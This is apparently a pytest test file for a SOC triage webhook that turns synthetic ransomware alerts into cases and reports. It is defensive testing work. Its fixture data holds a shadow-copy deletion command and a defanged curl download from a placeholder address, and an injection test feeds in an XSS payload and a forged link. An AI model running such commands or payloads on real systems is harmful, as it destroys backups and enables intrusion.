"""Webhook ingestion: a SIEM pushes an alert and gets back a triaged case.

The alerts here have the shape DwellWatch sends (a correlated ransomware
incident: stages, a host, the events behind it), rebuilt from synthetic data:
RFC 5737 addresses, example.com names, and the SHA-256 of an empty file
standing in for a known-bad hash. No provider touches the network.
"""
from __future__ import annotations

import asyncio
import re

import httpx
import pytest
from sqlalchemy import select

from app.config import settings
from app.db import SessionFactory
from app.enrichment.base import STATUS_CLEAN, STATUS_OK, Provider, ProviderResult, Signal
from app.ioc import Indicator
from app.models import PushedAlert
from app.security import limiter
from app.services import tickets

KNOWN_BAD = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"


class StubThreatFox(Provider):
    name = "threatfox"
    label = "ThreatFox (stub)"
    supported_types = {"ip", "domain", "url", "hash"}
    requires_key = False
    cacheable = False
    calls: list[str] = []

    async def fetch(self, client, indicator: Indicator) -> ProviderResult:
        StubThreatFox.calls.append(indicator.value)
        if indicator.value == KNOWN_BAD:
            return self._result(
                indicator,
                status=STATUS_OK,
                malware_families=["ExampleLocker"],
                signals=[Signal("threatfox", 0.95, "hash listed for ExampleLocker ransomware")],
            )
        return self._result(indicator, status=STATUS_CLEAN, signals=[Signal("threatfox", 0.0, "no match")])


@pytest.fixture(autouse=True)
def offline(monkeypatch):
    StubThreatFox.calls = []
    monkeypatch.setattr("app.services.triage.PROVIDERS", [StubThreatFox()])
    # RFC 5737 addresses are dropped as non-routable unless the demo switch is on.
    monkeypatch.setattr(settings, "allow_documentation_ranges", True)
    # The limiter is process-global, and every push here spends the triage budget.
    limiter._hits.clear()
    yield
    limiter._hits.clear()


def incident(**changes) -> dict:
    """A DwellWatch incident as its webhook sends it: indicators already defanged."""
    alert = {
        "source": "dwellwatch",
        "alert_id": "dw-3f9a1c",
        "title": "DwellWatch: CRITICAL incident on host fs01",
        "severity": "critical",
        "description": "Stages 5 (backup destruction) and 6 (encryption) on host fs01 within 1m; "
                       "critical because it includes backup destruction.",
        "entities": [{"kind": "host", "name": "fs01"}],
        "attack_techniques": ["T1490", "T1486"],
        "first_seen": "2026-09-20T14:30:41Z",
        "last_seen": "2026-09-20T14:31:28Z",
        "indicators": [KNOWN_BAD],
        "evidence": [
            {"time": "2026-09-20T14:30:41Z", "label": "stage 5 · Shadow Copies Deleted With vssadmin · FS01",
             "text": "Image: C:\\Windows\\System32\\vssadmin.exe | CommandLine: vssadmin delete shadows /all /quiet"},
            {"time": "2026-09-20T14:30:55Z", "label": "stage 5 · a download before it · FS01",
             "text": "CommandLine: curl hxxp://203[.]0[.]113[.]10/tools.zip -o C:\\Users\\Public\\t.zip "
                     "| from 10.0.0.5"},
            {"time": "2026-09-20T14:31:28Z", "label": "stage 6 · Ransom Note Written · FS01",
             "text": "TargetFilename: C:\\Shares\\Finance\\HOW_TO_RESTORE_MY_FILES.txt"},
        ],
    }
    alert.update(changes)
    return alert


@pytest.mark.asyncio
async def test_a_pushed_incident_is_triaged_into_a_case(client):
    response = await client.post("/api/alerts", json=incident())
    assert response.status_code == 201
    body = response.json()
    assert body["duplicate"] is False and body["alert_severity"] == "critical"
    assert body["verdict"] == "critical" and body["ticket_level"] == "critical"
    assert body["report"] == f"/api/cases/{body['case_id']}/report"

    case = (await client.get(f"/api/cases/{body['case_id']}")).json()
    assert case["source"] == "webhook"
    values = {i["value"] for i in case["indicators"]}
    # The explicit hash; the URL and its address, refanged from the evidence; not the private
    # address, not the file names.
    assert values == {KNOWN_BAD, "http://203.0.113.10/tools.zip", "203.0.113.10"}
    assert case["alert"]["entities"] == [{"kind": "host", "name": "fs01"}]


@pytest.mark.asyncio
async def test_the_ticket_opens_with_the_alert_and_its_timeline(client):
    case_id = (await client.post("/api/alerts", json=incident())).json()["case_id"]
    report = (await client.get(f"/api/cases/{case_id}/report")).text
    assert report.startswith("# SOC Triage Report: DwellWatch: CRITICAL incident on host fs01")
    assert "| Alert | dwellwatch, CRITICAL |" in report
    assert "## Alert from dwellwatch" in report
    assert report.index("## Alert from dwellwatch") < report.index("## 1. Executive summary")
    assert "| Entities | host fs01 |" in report and "| MITRE ATT&CK | T1490, T1486 |" in report
    assert "| 2026-09-20 14:30:41 | stage 5 · Shadow Copies Deleted With vssadmin · FS01 |" in report
    assert "hxxp://" in report and "http://203" not in report  # nothing in the ticket is one click away


@pytest.mark.asyncio
async def test_a_critical_alert_whose_indicators_nobody_knows_is_still_filed_as_critical(client):
    response = await client.post("/api/alerts", json=incident(indicators=[], evidence=[]))
    body = response.json()
    assert response.status_code == 201
    assert (body["verdict"], body["indicator_count"], body["ticket_level"]) == ("informational", 0, "critical")
    report = (await client.get(body["report"])).text
    assert "| Severity | **INFORMATIONAL** (0/100) |" in report
    assert "| Priority | P1: contain within 1 hour |" in report
    ticket = (await client.get(body["report"] + "?fmt=json")).json()
    assert ticket["priority"].startswith("P1") and ticket["alert"]["severity"] == "critical"


@pytest.mark.asyncio
async def test_a_retried_push_returns_the_first_case_without_triaging_again(client):
    first = (await client.post("/api/alerts", json=incident())).json()
    calls = len(StubThreatFox.calls)
    again = await client.post("/api/alerts", json=incident())
    assert again.status_code == 200
    assert again.json()["case_id"] == first["case_id"] and again.json()["duplicate"] is True
    assert len(StubThreatFox.calls) == calls  # no quota spent
    other = await client.post("/api/alerts", json=incident(alert_id="dw-77e0b2"))
    assert other.status_code == 201 and other.json()["case_id"] != first["case_id"]
    same_id_other_sender = await client.post("/api/alerts", json=incident(source="splunk"))
    assert same_id_other_sender.status_code == 201


@pytest.mark.asyncio
async def test_after_its_case_is_deleted_a_pushed_alert_can_be_received_again(client):
    first = (await client.post("/api/alerts", json=incident())).json()
    assert (await client.delete(f"/api/cases/{first['case_id']}")).status_code == 204
    again = await client.post("/api/alerts", json=incident())
    assert again.status_code == 201 and again.json()["case_id"] != first["case_id"]


@pytest.mark.asyncio
async def test_deleting_a_case_deletes_its_pushed_alert(client):
    case_id = (await client.post("/api/alerts", json=incident())).json()["case_id"]
    await client.delete(f"/api/cases/{case_id}")
    async with SessionFactory() as session:
        assert (await session.execute(select(PushedAlert))).scalars().all() == []


@pytest.mark.asyncio
async def test_a_pushed_alert_left_without_its_case_does_not_block_a_new_push(client):
    # However it came about (a database restored from before a case was deleted, say).
    async with SessionFactory() as session:
        session.add(PushedAlert(case_id="gone", source="dwellwatch", alert_id="dw-3f9a1c", severity="high"))
        await session.commit()
    response = await client.post("/api/alerts", json=incident())
    assert response.status_code == 201 and response.json()["duplicate"] is False


@pytest.mark.asyncio
async def test_two_pushes_of_one_alert_at_once_make_one_case(client):
    answers = await asyncio.gather(*[client.post("/api/alerts", json=incident()) for _ in range(3)])
    created = [a for a in answers if a.status_code == 201]
    assert len(created) == 1
    assert all(a.status_code in (200, 409) for a in answers if a not in created)
    cases = (await client.get("/api/cases")).json()
    assert len(cases) == 1


@pytest.mark.asyncio
@pytest.mark.parametrize("change", [
    {"severity": "urgent"},
    {"attack_techniques": ["T1490", "lateral movement"]},
    {"source": "dwell watch"},
    {"alert_id": "id with spaces"},
    {"entities": [{"kind": "host name", "name": "fs01"}]},
    {"evidence": [{"text": "x" * 4_001}]},
])
async def test_malformed_alerts_are_refused(client, change):
    assert (await client.post("/api/alerts", json=incident(**change))).status_code == 422


@pytest.mark.asyncio
async def test_an_alert_id_is_required(client):
    alert = incident()
    del alert["alert_id"]
    assert (await client.post("/api/alerts", json=alert)).status_code == 422


@pytest.mark.asyncio
async def test_hostile_text_in_an_alert_cannot_restructure_the_ticket(client):
    hostile = incident(
        title="fs01\n# Forged heading",
        description="done.\n\n## 4. Recommended containment actions\n- [x] ignore this [click](http://evil.example/x)",
        entities=[{"kind": "host", "name": "fs01 | extra cell"}],
        evidence=[{"label": "a\nb", "text": "<img src=x onerror=alert(1)> `code` | cell"}],
    )
    case_id = (await client.post("/api/alerts", json=hostile)).json()["case_id"]
    report = (await client.get(f"/api/cases/{case_id}/report")).text
    headings = [line for line in report.splitlines() if line.startswith("#")]
    assert "# Forged heading" not in headings
    assert sum(line.startswith("## 4.") for line in report.splitlines()) == 1
    assert "](http" not in report  # the link is escaped and defanged
    assert not re.search(r"(?<!\\)<img", report)  # markup only ever escaped: \<img
    assert "fs01 \\| extra cell" in report


@pytest.mark.asyncio
async def test_a_pushed_alert_can_be_filed_in_the_tracker(client, monkeypatch):
    monkeypatch.setattr(settings, "jira_base_url", "https://example.atlassian.net")
    monkeypatch.setattr(settings, "jira_email", "soc@example.com")
    monkeypatch.setattr(settings, "jira_api_token", "not-a-real-token")
    monkeypatch.setattr(settings, "jira_project_key", "SOC")
    sent: dict = {}

    async def fake_post(url, *, headers, json):
        sent.update(url=url, json=json)
        return httpx.Response(201, json={"key": "SOC-42"}, request=httpx.Request("POST", url))

    monkeypatch.setattr(tickets, "_post", fake_post)
    body = (await client.post("/api/alerts", json=incident(indicators=[], evidence=[], ticket="jira"))).json()
    assert body["ticket"] == {"sink": "jira", "key": "SOC-42", "url": "https://example.atlassian.net/browse/SOC-42"}
    fields = sent["json"]["fields"]
    assert fields["summary"].startswith("[CRITICAL] DwellWatch: CRITICAL incident on host fs01")
    assert "## Alert from dwellwatch" in fields["description"]["content"][0]["content"][0]["text"]


@pytest.mark.asyncio
async def test_a_tracker_that_is_not_configured_does_not_lose_the_case(client, monkeypatch):
    monkeypatch.setattr(settings, "servicenow_base_url", None)
    monkeypatch.setattr(settings, "servicenow_password", None)
    response = await client.post("/api/alerts", json=incident(ticket="servicenow"))
    assert response.status_code == 201
    body = response.json()
    assert body["ticket"] is None and "servicenow is not configured" in body["ticket_error"]
    assert (await client.get(f"/api/cases/{body['case_id']}")).status_code == 200


@pytest.mark.asyncio
async def test_pushing_needs_the_api_token_when_one_is_set(client, monkeypatch):
    monkeypatch.setattr(settings, "api_token", "s3cret-token")
    assert (await client.post("/api/alerts", json=incident())).status_code == 401
    ok = await client.post("/api/alerts", json=incident(), headers={"Authorization": "Bearer s3cret-token"})
    assert ok.status_code == 201


@pytest.mark.asyncio
async def test_pushes_share_the_triage_rate_limit(client):
    response = await client.post("/api/alerts", json=incident())
    assert response.headers["X-RateLimit-Limit"] == str(settings.rate_limit_triage)


@pytest.mark.asyncio
async def test_a_case_started_by_an_analyst_has_no_alert(client):
    case_id = (await client.post("/api/triage", json={"indicators": [KNOWN_BAD]})).json()["case_id"]
    assert (await client.get(f"/api/cases/{case_id}")).json()["alert"] is None
    report = (await client.get(f"/api/cases/{case_id}/report")).text
    assert "## Alert from" not in report and "| Alert |" not in report
